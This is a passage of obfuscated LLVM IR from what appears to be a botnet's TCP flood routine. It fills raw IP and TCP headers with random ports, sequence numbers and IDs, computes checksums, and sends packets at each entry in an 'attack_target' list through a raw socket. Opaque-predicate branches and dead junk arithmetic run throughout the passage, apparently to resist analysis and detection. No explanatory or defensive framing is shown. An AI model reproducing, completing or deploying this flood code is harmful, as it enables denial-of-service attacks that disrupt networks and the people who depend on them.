  %431 = load i32, i32* @y.28
  %432 = sub i32 %430, 1
  %433 = mul i32 %430, %432
  %434 = urem i32 %433, 2
  %435 = icmp eq i32 %434, 0
  %436 = icmp slt i32 %431, 10
  %437 = or i1 %435, %436
  br i1 %437, label %originalBB202, label %originalBB202alteredBB

originalBB202:                                    ; preds = %originalBB202alteredBB, %429
  %438 = call i32 @rand_next()
  %439 = load %struct.iphdr*, %struct.iphdr** %41, align 8
  %440 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %439, i32 0, i32 8
  store i32 %438, i32* %440, align 4
  %441 = load i32, i32* @x.27
  %442 = load i32, i32* @y.28
  %443 = sub i32 %441, 1
  %444 = mul i32 %441, %443
  %445 = urem i32 %444, 2
  %446 = icmp eq i32 %445, 0
  %447 = icmp slt i32 %442, 10
  %448 = or i1 %446, %447
  br i1 %448, label %originalBBpart2204, label %originalBB202alteredBB

originalBBpart2204:                               ; preds = %originalBB202
  br label %449

; <label>:449:                                    ; preds = %originalBBpart2204, %originalBBpart2200
  %450 = load i32, i32* @x.27
  %451 = load i32, i32* @y.28
  %452 = sub i32 %450, 1
  %453 = mul i32 %450, %452
  %454 = urem i32 %453, 2
  %455 = icmp eq i32 %454, 0
  %456 = icmp slt i32 %451, 10
  %457 = or i1 %455, %456
  br i1 %457, label %originalBB206, label %originalBB206alteredBB

originalBB206:                                    ; preds = %originalBB206alteredBB, %449
  %458 = load i16, i16* %21, align 2
  %459 = zext i16 %458 to i32
  %460 = icmp eq i32 %459, 65535
  %461 = load i32, i32* @x.27
  %462 = load i32, i32* @y.28
  %463 = sub i32 %461, 1
  %464 = mul i32 %461, %463
  %465 = urem i32 %464, 2
  %466 = icmp eq i32 %465, 0
  %467 = icmp slt i32 %462, 10
  %468 = or i1 %466, %467
  br i1 %468, label %originalBBpart2208, label %originalBB206alteredBB

originalBBpart2208:                               ; preds = %originalBB206
  br i1 %460, label %469, label %491

; <label>:469:                                    ; preds = %originalBBpart2208
  %470 = load i32, i32* @x.27
  %471 = load i32, i32* @y.28
  %472 = sub i32 %470, 1
  %473 = mul i32 %470, %472
  %474 = urem i32 %473, 2
  %475 = icmp eq i32 %474, 0
  %476 = icmp slt i32 %471, 10
  %477 = or i1 %475, %476
  br i1 %477, label %originalBB210, label %originalBB210alteredBB

originalBB210:                                    ; preds = %originalBB210alteredBB, %469
  %478 = call i32 @rand_next()
  %479 = and i32 %478, 65535
  %480 = trunc i32 %479 to i16
  %481 = load %struct.iphdr*, %struct.iphdr** %41, align 8
  %482 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %481, i32 0, i32 3
  store i16 %480, i16* %482, align 4
  %483 = load i32, i32* @x.27
  %484 = load i32, i32* @y.28
  %485 = sub i32 %483, 1
  %486 = mul i32 %483, %485
  %487 = urem i32 %486, 2
  %488 = icmp eq i32 %487, 0
  %489 = icmp slt i32 %484, 10
  %490 = or i1 %488, %489
  br i1 %490, label %originalBBpart2221, label %originalBB210alteredBB

originalBBpart2221:                               ; preds = %originalBB210
  br label %491

; <label>:491:                                    ; preds = %originalBBpart2221, %originalBBpart2208
  %492 = load i16, i16* %24, align 2
  %493 = zext i16 %492 to i32
  %494 = icmp eq i32 %493, 65535
  br i1 %494, label %495, label %501

; <label>:495:                                    ; preds = %491
  %496 = call i32 @rand_next()
  %497 = and i32 %496, 65535
  %498 = trunc i32 %497 to i16
  %499 = load %struct.tcphdr*, %struct.tcphdr** %42, align 8
  %500 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %499, i32 0, i32 0
  store i16 %498, i16* %500, align 4
  br label %501

; <label>:501:                                    ; preds = %495, %491
  %502 = load i16, i16* %25, align 2
  %503 = zext i16 %502 to i32
  %504 = icmp eq i32 %503, 65535
  br i1 %504, label %505, label %511

; <label>:505:                                    ; preds = %501
  %506 = call i32 @rand_next()
  %507 = and i32 %506, 65535
  %508 = trunc i32 %507 to i16
  %509 = load %struct.tcphdr*, %struct.tcphdr** %42, align 8
  %510 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %509, i32 0, i32 1
  store i16 %508, i16* %510, align 2
  br label %511

; <label>:511:                                    ; preds = %505, %501
  %512 = load i32, i32* @x.27
  %513 = load i32, i32* @y.28
  %514 = sub i32 %512, 1
  %515 = mul i32 %512, %514
  %516 = urem i32 %515, 2
  %517 = icmp eq i32 %516, 0
  %518 = icmp slt i32 %513, 10
  %519 = or i1 %517, %518
  br i1 %519, label %originalBB223, label %originalBB223alteredBB

originalBB223:                                    ; preds = %originalBB223alteredBB, %511
  %520 = load i32, i32* %26, align 4
  %521 = icmp eq i32 %520, 65535
  %522 = load i32, i32* @x.27
  %523 = load i32, i32* @y.28
  %524 = sub i32 %522, 1
  %525 = mul i32 %522, %524
  %526 = urem i32 %525, 2
  %527 = icmp eq i32 %526, 0
  %528 = icmp slt i32 %523, 10
  %529 = or i1 %527, %528
  br i1 %529, label %originalBBpart2225, label %originalBB223alteredBB

originalBBpart2225:                               ; preds = %originalBB223
  br i1 %521, label %530, label %550

; <label>:530:                                    ; preds = %originalBBpart2225
  %531 = load i32, i32* @x.27
  %532 = load i32, i32* @y.28
  %533 = sub i32 %531, 1
  %534 = mul i32 %531, %533
  %535 = urem i32 %534, 2
  %536 = icmp eq i32 %535, 0
  %537 = icmp slt i32 %532, 10
  %538 = or i1 %536, %537
  br i1 %538, label %originalBB227, label %originalBB227alteredBB

originalBB227:                                    ; preds = %originalBB227alteredBB, %530
  %539 = call i32 @rand_next()
  %540 = load %struct.tcphdr*, %struct.tcphdr** %42, align 8
  %541 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %540, i32 0, i32 2
  store i32 %539, i32* %541, align 4
  %542 = load i32, i32* @x.27
  %543 = load i32, i32* @y.28
  %544 = sub i32 %542, 1
  %545 = mul i32 %542, %544
  %546 = urem i32 %545, 2
  %547 = icmp eq i32 %546, 0
  %548 = icmp slt i32 %543, 10
  %549 = or i1 %547, %548
  br i1 %549, label %originalBBpart2229, label %originalBB227alteredBB

originalBBpart2229:                               ; preds = %originalBB227
  br label %550

; <label>:550:                                    ; preds = %originalBBpart2229, %originalBBpart2225
  %551 = load i32, i32* @x.27
  %552 = load i32, i32* @y.28
  %553 = sub i32 %551, 1
  %554 = mul i32 %551, %553
  %555 = urem i32 %554, 2
  %556 = icmp eq i32 %555, 0
  %557 = icmp slt i32 %552, 10
  %558 = or i1 %556, %557
  br i1 %558, label %originalBB231, label %originalBB231alteredBB

originalBB231:                                    ; preds = %originalBB231alteredBB, %550
  %559 = load i32, i32* %27, align 4
  %560 = icmp eq i32 %559, 65535
  %561 = load i32, i32* @x.27
  %562 = load i32, i32* @y.28
  %563 = sub i32 %561, 1
  %564 = mul i32 %561, %563
  %565 = urem i32 %564, 2
  %566 = icmp eq i32 %565, 0
  %567 = icmp slt i32 %562, 10
  %568 = or i1 %566, %567
  br i1 %568, label %originalBBpart2233, label %originalBB231alteredBB

originalBBpart2233:                               ; preds = %originalBB231
  br i1 %560, label %569, label %573

; <label>:569:                                    ; preds = %originalBBpart2233
  %570 = call i32 @rand_next()
  %571 = load %struct.tcphdr*, %struct.tcphdr** %42, align 8
  %572 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %571, i32 0, i32 3
  store i32 %570, i32* %572, align 4
  br label %573

; <label>:573:                                    ; preds = %569, %originalBBpart2233
  %574 = load i32, i32* @x.27
  %575 = load i32, i32* @y.28
  %576 = sub i32 %574, 1
  %577 = mul i32 %574, %576
  %578 = urem i32 %577, 2
  %579 = icmp eq i32 %578, 0
  %580 = icmp slt i32 %575, 10
  %581 = or i1 %579, %580
  br i1 %581, label %originalBB235, label %originalBB235alteredBB

originalBB235:                                    ; preds = %originalBB235alteredBB, %573
  %582 = load i8, i8* %35, align 1
  %583 = icmp ne i8 %582, 0
  %584 = load i32, i32* @x.27
  %585 = load i32, i32* @y.28
  %586 = sub i32 %584, 1
  %587 = mul i32 %584, %586
  %588 = urem i32 %587, 2
  %589 = icmp eq i32 %588, 0
  %590 = icmp slt i32 %585, 10
  %591 = or i1 %589, %590
  br i1 %591, label %originalBBpart2237, label %originalBB235alteredBB

originalBBpart2237:                               ; preds = %originalBB235
  br i1 %583, label %592, label %595

; <label>:592:                                    ; preds = %originalBBpart2237
  %593 = load i8*, i8** %43, align 8
  %594 = load i32, i32* %34, align 4
  call void @rand_str(i8* %593, i32 %594)
  br label %595

; <label>:595:                                    ; preds = %592, %originalBBpart2237
  %596 = load i32, i32* @x.27
  %597 = load i32, i32* @y.28
  %598 = sub i32 %596, 1
  %599 = mul i32 %596, %598
  %600 = urem i32 %599, 2
  %601 = icmp eq i32 %600, 0
  %602 = icmp slt i32 %597, 10
  %603 = or i1 %601, %602
  br i1 %603, label %originalBB239, label %originalBB239alteredBB

originalBB239:                                    ; preds = %originalBB239alteredBB, %595
  %604 = load %struct.iphdr*, %struct.iphdr** %41, align 8
  %605 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %604, i32 0, i32 7
  store i16 0, i16* %605, align 2
  %606 = load %struct.iphdr*, %struct.iphdr** %41, align 8
  %607 = bitcast %struct.iphdr* %606 to i16*
  %608 = call zeroext i16 @checksum_generic(i16* %607, i32 20)
  %609 = load %struct.iphdr*, %struct.iphdr** %41, align 8
  %610 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %609, i32 0, i32 7
  store i16 %608, i16* %610, align 2
  %611 = load %struct.tcphdr*, %struct.tcphdr** %42, align 8
  %612 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %611, i32 0, i32 6
  store i16 0, i16* %612, align 4
  %613 = load %struct.iphdr*, %struct.iphdr** %41, align 8
  %614 = load %struct.tcphdr*, %struct.tcphdr** %42, align 8
  %615 = bitcast %struct.tcphdr* %614 to i8*
  %616 = load i32, i32* %34, align 4
  %617 = sext i32 %616 to i64
  %618 = add i64 20, %617
  %619 = trunc i64 %618 to i16
  %620 = call zeroext i16 @htons(i16 zeroext %619) #7
  %621 = load i32, i32* %34, align 4
  %622 = sext i32 %621 to i64
  %623 = add i64 20, %622
  %624 = trunc i64 %623 to i32
  %625 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %613, i8* %615, i16 zeroext %620, i32 %624)
  %626 = load %struct.tcphdr*, %struct.tcphdr** %42, align 8
  %627 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %626, i32 0, i32 6
  store i16 %625, i16* %627, align 4
  %628 = load %struct.tcphdr*, %struct.tcphdr** %42, align 8
  %629 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %628, i32 0, i32 1
  %630 = load i16, i16* %629, align 2
  %631 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %632 = load i32, i32* %17, align 4
  %633 = sext i32 %632 to i64
  %634 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %631, i64 %633
  %635 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %634, i32 0, i32 0
  %636 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %635, i32 0, i32 1
  store i16 %630, i16* %636, align 2
  %637 = load i32, i32* %18, align 4
  %638 = load i8*, i8** %40, align 8
  %639 = load i32, i32* %34, align 4
  %640 = sext i32 %639 to i64
  %641 = add i64 40, %640
  %642 = bitcast %union.__CONST_SOCKADDR_ARG* %44 to %struct.sockaddr**
  %643 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %644 = load i32, i32* %17, align 4
  %645 = sext i32 %644 to i64
  %646 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %643, i64 %645
  %647 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %646, i32 0, i32 0
  %648 = bitcast %struct.sockaddr_in* %647 to %struct.sockaddr*
  store %struct.sockaddr* %648, %struct.sockaddr** %642, align 8
  %649 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %44, i32 0, i32 0
  %650 = load %struct.sockaddr*, %struct.sockaddr** %649, align 8
  %651 = call i64 @sendto(i32 %637, i8* %638, i64 %641, i32 16384, %struct.sockaddr* %650, i32 16)
  %652 = load i32, i32* @x.27
  %653 = load i32, i32* @y.28
  %654 = sub i32 %652, 1
  %655 = mul i32 %652, %654
  %656 = urem i32 %655, 2
  %657 = icmp eq i32 %656, 0
  %658 = icmp slt i32 %653, 10
  %659 = or i1 %657, %658
  br i1 %659, label %originalBBpart2265, label %originalBB239alteredBB

originalBBpart2265:                               ; preds = %originalBB239
  br label %660

; <label>:660:                                    ; preds = %originalBBpart2265
  %661 = load i32, i32* %17, align 4
  %662 = add nsw i32 %661, 1
  store i32 %662, i32* %17, align 4
  br label %346

; <label>:663:                                    ; preds = %346
  br label %329

; <label>:664:                                    ; preds = %130, %124
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %4
  %665 = alloca i8, align 1
  %666 = alloca %struct.attack_target*, align 8
  %667 = alloca i8, align 1
  %668 = alloca %struct.attack_option*, align 8
  %669 = alloca i32, align 4
  %670 = alloca i32, align 4
  %671 = alloca i8**, align 8
  %672 = alloca i8, align 1
  %673 = alloca i16, align 2
  %674 = alloca i8, align 1
  %675 = alloca i8, align 1
  %676 = alloca i16, align 2
  %677 = alloca i16, align 2
  %678 = alloca i32, align 4
  %679 = alloca i32, align 4
  %680 = alloca i8, align 1
  %681 = alloca i8, align 1
  %682 = alloca i8, align 1
  %683 = alloca i8, align 1
  %684 = alloca i8, align 1
  %685 = alloca i8, align 1
  %686 = alloca i32, align 4
  %687 = alloca i8, align 1
  %688 = alloca i32, align 4
  %689 = alloca %struct.iphdr*, align 8
  %690 = alloca %struct.tcphdr*, align 8
  %691 = alloca i8*, align 8
  %692 = alloca i8*, align 8
  %693 = alloca %struct.iphdr*, align 8
  %694 = alloca %struct.tcphdr*, align 8
  %695 = alloca i8*, align 8
  %696 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %665, align 1
  store %struct.attack_target* %1, %struct.attack_target** %666, align 8
  store i8 %2, i8* %667, align 1
  store %struct.attack_option* %3, %struct.attack_option** %668, align 8
  %697 = load i8, i8* %665, align 1
  %698 = zext i8 %697 to i64
  %699 = call noalias i8* @calloc(i64 %698, i64 8) #6
  %700 = bitcast i8* %699 to i8**
  store i8** %700, i8*** %671, align 8
  %701 = load i8, i8* %667, align 1
  %702 = load %struct.attack_option*, %struct.attack_option** %668, align 8
  %703 = call i32 @attack_get_opt_int(i8 zeroext %701, %struct.attack_option* %702, i8 zeroext 2, i32 0)
  %704 = trunc i32 %703 to i8
  store i8 %704, i8* %672, align 1
  %705 = load i8, i8* %667, align 1
  %706 = load %struct.attack_option*, %struct.attack_option** %668, align 8
  %707 = call i32 @attack_get_opt_int(i8 zeroext %705, %struct.attack_option* %706, i8 zeroext 3, i32 65535)
  %708 = trunc i32 %707 to i16
  store i16 %708, i16* %673, align 2
  %709 = load i8, i8* %667, align 1
  %710 = load %struct.attack_option*, %struct.attack_option** %668, align 8
  %711 = call i32 @attack_get_opt_int(i8 zeroext %709, %struct.attack_option* %710, i8 zeroext 4, i32 64)
  %712 = trunc i32 %711 to i8
  store i8 %712, i8* %674, align 1
  %713 = load i8, i8* %667, align 1
  %714 = load %struct.attack_option*, %struct.attack_option** %668, align 8
  %715 = call i32 @attack_get_opt_int(i8 zeroext %713, %struct.attack_option* %714, i8 zeroext 5, i32 0)
  %716 = trunc i32 %715 to i8
  store i8 %716, i8* %675, align 1
  %717 = load i8, i8* %667, align 1
  %718 = load %struct.attack_option*, %struct.attack_option** %668, align 8
  %719 = call i32 @attack_get_opt_int(i8 zeroext %717, %struct.attack_option* %718, i8 zeroext 6, i32 65535)
  %720 = trunc i32 %719 to i16
  store i16 %720, i16* %676, align 2
  %721 = load i8, i8* %667, align 1
  %722 = load %struct.attack_option*, %struct.attack_option** %668, align 8
  %723 = call i32 @attack_get_opt_int(i8 zeroext %721, %struct.attack_option* %722, i8 zeroext 7, i32 65535)
  %724 = trunc i32 %723 to i16
  store i16 %724, i16* %677, align 2
  %725 = load i8, i8* %667, align 1
  %726 = load %struct.attack_option*, %struct.attack_option** %668, align 8
  %727 = call i32 @attack_get_opt_int(i8 zeroext %725, %struct.attack_option* %726, i8 zeroext 17, i32 65535)
  store i32 %727, i32* %678, align 4
  %728 = load i8, i8* %667, align 1
  %729 = load %struct.attack_option*, %struct.attack_option** %668, align 8
  %730 = call i32 @attack_get_opt_int(i8 zeroext %728, %struct.attack_option* %729, i8 zeroext 18, i32 65535)
  store i32 %730, i32* %679, align 4
  %731 = load i8, i8* %667, align 1
  %732 = load %struct.attack_option*, %struct.attack_option** %668, align 8
  %733 = call i32 @attack_get_opt_int(i8 zeroext %731, %struct.attack_option* %732, i8 zeroext 11, i32 0)
  %734 = trunc i32 %733 to i8
  store i8 %734, i8* %680, align 1
  %735 = load i8, i8* %667, align 1
  %736 = load %struct.attack_option*, %struct.attack_option** %668, align 8
  %737 = call i32 @attack_get_opt_int(i8 zeroext %735, %struct.attack_option* %736, i8 zeroext 12, i32 1)
  %738 = trunc i32 %737 to i8
  store i8 %738, i8* %681, align 1
  %739 = load i8, i8* %667, align 1
  %740 = load %struct.attack_option*, %struct.attack_option** %668, align 8
  %741 = call i32 @attack_get_opt_int(i8 zeroext %739, %struct.attack_option* %740, i8 zeroext 13, i32 0)
  %742 = trunc i32 %741 to i8
  store i8 %742, i8* %682, align 1
  %743 = load i8, i8* %667, align 1
  %744 = load %struct.attack_option*, %struct.attack_option** %668, align 8
  %745 = call i32 @attack_get_opt_int(i8 zeroext %743, %struct.attack_option* %744, i8 zeroext 14, i32 0)
  %746 = trunc i32 %745 to i8
  store i8 %746, i8* %683, align 1
  %747 = load i8, i8* %667, align 1
  %748 = load %struct.attack_option*, %struct.attack_option** %668, align 8
  %749 = call i32 @attack_get_opt_int(i8 zeroext %747, %struct.attack_option* %748, i8 zeroext 15, i32 0)
  %750 = trunc i32 %749 to i8
  store i8 %750, i8* %684, align 1
  %751 = load i8, i8* %667, align 1
  %752 = load %struct.attack_option*, %struct.attack_option** %668, align 8
  %753 = call i32 @attack_get_opt_int(i8 zeroext %751, %struct.attack_option* %752, i8 zeroext 16, i32 0)
  %754 = trunc i32 %753 to i8
  store i8 %754, i8* %685, align 1
  %755 = load i8, i8* %667, align 1
  %756 = load %struct.attack_option*, %struct.attack_option** %668, align 8
  %757 = call i32 @attack_get_opt_int(i8 zeroext %755, %struct.attack_option* %756, i8 zeroext 0, i32 512)
  store i32 %757, i32* %686, align 4
  %758 = load i8, i8* %667, align 1
  %759 = load %struct.attack_option*, %struct.attack_option** %668, align 8
  %760 = call i32 @attack_get_opt_int(i8 zeroext %758, %struct.attack_option* %759, i8 zeroext 1, i32 1)
  %761 = trunc i32 %760 to i8
  store i8 %761, i8* %687, align 1
  %762 = load i8, i8* %667, align 1
  %763 = load %struct.attack_option*, %struct.attack_option** %668, align 8
  %764 = load i32, i32* @LOCAL_ADDR, align 4
  %765 = call i32 @attack_get_opt_ip(i8 zeroext %762, %struct.attack_option* %763, i8 zeroext 25, i32 %764)
  store i32 %765, i32* %688, align 4
  %766 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %766, i32* %670, align 4
  %767 = icmp eq i32 %766, -1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %134
  %768 = load i32, i32* %17, align 4
  %769 = load i8, i8* %13, align 1
  %770 = zext i8 %769 to i32
  %771 = icmp slt i32 %768, %770
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %206
  %772 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %773 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %772, i32 0, i32 6
  store i8 6, i8* %773, align 1
  %774 = load i32, i32* %36, align 4
  %775 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %776 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %775, i32 0, i32 8
  store i32 %774, i32* %776, align 4
  %777 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %778 = load i32, i32* %17, align 4
  %779 = sext i32 %778 to i64
  %780 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %777, i64 %779
  %781 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %780, i32 0, i32 1
  %782 = load i32, i32* %781, align 4
  %783 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %784 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %783, i32 0, i32 9
  store i32 %782, i32* %784, align 4
  %785 = load i16, i16* %24, align 2
  %786 = call zeroext i16 @htons(i16 zeroext %785) #7
  %787 = load %struct.tcphdr*, %struct.tcphdr** %38, align 8
  %788 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %787, i32 0, i32 0
  store i16 %786, i16* %788, align 4
  %789 = load i16, i16* %25, align 2
  %790 = call zeroext i16 @htons(i16 zeroext %789) #7
  %791 = load %struct.tcphdr*, %struct.tcphdr** %38, align 8
  %792 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %791, i32 0, i32 1
  store i16 %790, i16* %792, align 2
  %793 = load i32, i32* %26, align 4
  %794 = trunc i32 %793 to i16
  %795 = call zeroext i16 @htons(i16 zeroext %794) #7
  %796 = zext i16 %795 to i32
  %797 = load %struct.tcphdr*, %struct.tcphdr** %38, align 8
  %798 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %797, i32 0, i32 2
  store i32 %796, i32* %798, align 4
  %799 = load %struct.tcphdr*, %struct.tcphdr** %38, align 8
  %800 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %799, i32 0, i32 4
  %801 = load i16, i16* %800, align 4
  %_ = sub i16 0, %801
  %gen = add i16 %_, -241
  %_7 = shl i16 %801, -241
  %_8 = shl i16 %801, -241
  %_9 = sub i16 0, %801
  %gen10 = add i16 %_9, -241
  %802 = and i16 %801, -241
  %_11 = shl i16 %802, 80
  %_12 = sub i16 0, %802
  %gen13 = add i16 %_12, 80
  %_14 = shl i16 %802, 80
  %_15 = sub i16 %802, 80
  %gen16 = mul i16 %_15, 80
  %_17 = sub i16 0, %802
  %gen18 = add i16 %_17, 80
  %_19 = shl i16 %802, 80
  %803 = or i16 %802, 80
  store i16 %803, i16* %800, align 4
  %804 = load i8, i8* %28, align 1
  %805 = sext i8 %804 to i16
  %806 = load %struct.tcphdr*, %struct.tcphdr** %38, align 8
  %807 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %806, i32 0, i32 4
  %808 = load i16, i16* %807, align 4
  %_20 = sub i16 %805, 1
  %gen21 = mul i16 %_20, 1
  %_22 = sub i16 %805, 1
  %gen23 = mul i16 %_22, 1
  %_24 = sub i16 %805, 1
  %gen25 = mul i16 %_24, 1
  %_26 = sub i16 0, %805
  %gen27 = add i16 %_26, 1
  %_28 = shl i16 %805, 1
  %_29 = sub i16 0, %805
  %gen30 = add i16 %_29, 1
  %809 = and i16 %805, 1
  %_31 = shl i16 %809, 13
  %_32 = sub i16 0, %809
  %gen33 = add i16 %_32, 13
  %_34 = sub i16 0, %809
  %gen35 = add i16 %_34, 13
  %_36 = shl i16 %809, 13
  %810 = shl i16 %809, 13
  %_37 = shl i16 %808, -8193
  %_38 = shl i16 %808, -8193
  %_39 = shl i16 %808, -8193
  %_40 = shl i16 %808, -8193
  %811 = and i16 %808, -8193
  %_41 = sub i16 %811, %810
  %gen42 = mul i16 %_41, %810
  %_43 = sub i16 %811, %810
  %gen44 = mul i16 %_43, %810
  %_45 = sub i16 %811, %810
  %gen46 = mul i16 %_45, %810
  %812 = or i16 %811, %810
  store i16 %812, i16* %807, align 4
  %813 = load i8, i8* %29, align 1
  %814 = sext i8 %813 to i16
  %815 = load %struct.tcphdr*, %struct.tcphdr** %38, align 8
  %816 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %815, i32 0, i32 4
  %817 = load i16, i16* %816, align 4
  %_47 = shl i16 %814, 1
  %_48 = sub i16 0, %814
  %gen49 = add i16 %_48, 1
  %_50 = shl i16 %814, 1
  %_51 = sub i16 0, %814
  %gen52 = add i16 %_51, 1
  %_53 = sub i16 %814, 1
  %gen54 = mul i16 %_53, 1
  %_55 = sub i16 %814, 1
  %gen56 = mul i16 %_55, 1
  %818 = and i16 %814, 1
  %_57 = sub i16 %818, 12
  %gen58 = mul i16 %_57, 12
  %_59 = shl i16 %818, 12
  %_60 = shl i16 %818, 12
  %_61 = sub i16 0, %818
  %gen62 = add i16 %_61, 12
  %_63 = sub i16 0, %818
  %gen64 = add i16 %_63, 12
  %819 = shl i16 %818, 12
  %_65 = sub i16 0, %817
  %gen66 = add i16 %_65, -4097
  %_67 = sub i16 0, %817
  %gen68 = add i16 %_67, -4097
  %_69 = sub i16 0, %817
  %gen70 = add i16 %_69, -4097
  %820 = and i16 %817, -4097
  %_71 = sub i16 0, %820
  %gen72 = add i16 %_71, %819
  %_73 = shl i16 %820, %819
  %821 = or i16 %820, %819
  store i16 %821, i16* %816, align 4
  %822 = load i8, i8* %30, align 1
  %823 = sext i8 %822 to i16
  %824 = load %struct.tcphdr*, %struct.tcphdr** %38, align 8
  %825 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %824, i32 0, i32 4
  %826 = load i16, i16* %825, align 4
  %_74 = sub i16 %823, 1
  %gen75 = mul i16 %_74, 1
  %_76 = sub i16 0, %823
  %gen77 = add i16 %_76, 1
  %827 = and i16 %823, 1
  %_78 = sub i16 %827, 11
  %gen79 = mul i16 %_78, 11
  %_80 = sub i16 %827, 11
  %gen81 = mul i16 %_80, 11
  %_82 = sub i16 %827, 11
  %gen83 = mul i16 %_82, 11
  %_84 = shl i16 %827, 11
  %_85 = shl i16 %827, 11
  %_86 = shl i16 %827, 11
  %_87 = sub i16 0, %827
  %gen88 = add i16 %_87, 11
  %_89 = shl i16 %827, 11
  %_90 = sub i16 %827, 11
  %gen91 = mul i16 %_90, 11
  %828 = shl i16 %827, 11
  %_92 = sub i16 0, %826
  %gen93 = add i16 %_92, -2049
  %_94 = sub i16 %826, -2049
  %gen95 = mul i16 %_94, -2049
  %_96 = sub i16 0, %826
  %gen97 = add i16 %_96, -2049
  %829 = and i16 %826, -2049
  %_98 = sub i16 0, %829
  %gen99 = add i16 %_98, %828
  %_100 = shl i16 %829, %828
  %_101 = sub i16 0, %829
  %gen102 = add i16 %_101, %828
  %_103 = sub i16 0, %829
  %gen104 = add i16 %_103, %828
  %_105 = sub i16 %829, %828
  %gen106 = mul i16 %_105, %828
  %_107 = shl i16 %829, %828
  %_108 = sub i16 %829, %828
  %gen109 = mul i16 %_108, %828
  %830 = or i16 %829, %828
  store i16 %830, i16* %825, align 4
  %831 = load i8, i8* %31, align 1
  %832 = sext i8 %831 to i16
  %833 = load %struct.tcphdr*, %struct.tcphdr** %38, align 8
  %834 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %833, i32 0, i32 4
  %835 = load i16, i16* %834, align 4
  %_110 = shl i16 %832, 1
  %_111 = sub i16 %832, 1
  %gen112 = mul i16 %_111, 1
  %_113 = shl i16 %832, 1
  %_114 = sub i16 0, %832
  %gen115 = add i16 %_114, 1
  %836 = and i16 %832, 1
  %_116 = sub i16 %836, 10
  %gen117 = mul i16 %_116, 10
  %_118 = shl i16 %836, 10
  %_119 = sub i16 %836, 10
  %gen120 = mul i16 %_119, 10
  %_121 = shl i16 %836, 10
  %_122 = sub i16 0, %836
  %gen123 = add i16 %_122, 10
  %_124 = shl i16 %836, 10
  %837 = shl i16 %836, 10
  %_125 = sub i16 %835, -1025
  %gen126 = mul i16 %_125, -1025
  %_127 = shl i16 %835, -1025
  %_128 = sub i16 0, %835
  %gen129 = add i16 %_128, -1025
  %_130 = shl i16 %835, -1025
  %_131 = sub i16 %835, -1025
  %gen132 = mul i16 %_131, -1025
  %838 = and i16 %835, -1025
  %_133 = sub i16 0, %838
  %gen134 = add i16 %_133, %837
  %_135 = sub i16 0, %838
  %gen136 = add i16 %_135, %837
  %_137 = sub i16 0, %838
  %gen138 = add i16 %_137, %837
  %_139 = sub i16 0, %838
  %gen140 = add i16 %_139, %837
  %_141 = sub i16 %838, %837
  %gen142 = mul i16 %_141, %837
  %_143 = sub i16 0, %838
  %gen144 = add i16 %_143, %837
  %_145 = sub i16 0, %838
  %gen146 = add i16 %_145, %837
  %839 = or i16 %838, %837
  store i16 %839, i16* %834, align 4
  %840 = load i8, i8* %32, align 1
  %841 = sext i8 %840 to i16
  %842 = load %struct.tcphdr*, %struct.tcphdr** %38, align 8
  %843 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %842, i32 0, i32 4
  %844 = load i16, i16* %843, align 4
  %_147 = shl i16 %841, 1
  %_148 = sub i16 %841, 1
  %gen149 = mul i16 %_148, 1
  %_150 = shl i16 %841, 1
  %_151 = sub i16 %841, 1
  %gen152 = mul i16 %_151, 1
  %_153 = shl i16 %841, 1
  %_154 = shl i16 %841, 1
  %_155 = shl i16 %841, 1
  %_156 = shl i16 %841, 1
  %845 = and i16 %841, 1
  %_157 = sub i16 0, %845
  %gen158 = add i16 %_157, 9
  %_159 = sub i16 %845, 9
  %gen160 = mul i16 %_159, 9
  %846 = shl i16 %845, 9
  %847 = and i16 %844, -513
  %_161 = sub i16 %847, %846
  %gen162 = mul i16 %_161, %846
  %848 = or i16 %847, %846
  store i16 %848, i16* %843, align 4
  %849 = load i8, i8* %33, align 1
  %850 = sext i8 %849 to i16
  %851 = load %struct.tcphdr*, %struct.tcphdr** %38, align 8
  %852 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %851, i32 0, i32 4
  %853 = load i16, i16* %852, align 4
  %_163 = sub i16 %850, 1
  %gen164 = mul i16 %_163, 1
  %_165 = shl i16 %850, 1
  %_166 = sub i16 %850, 1
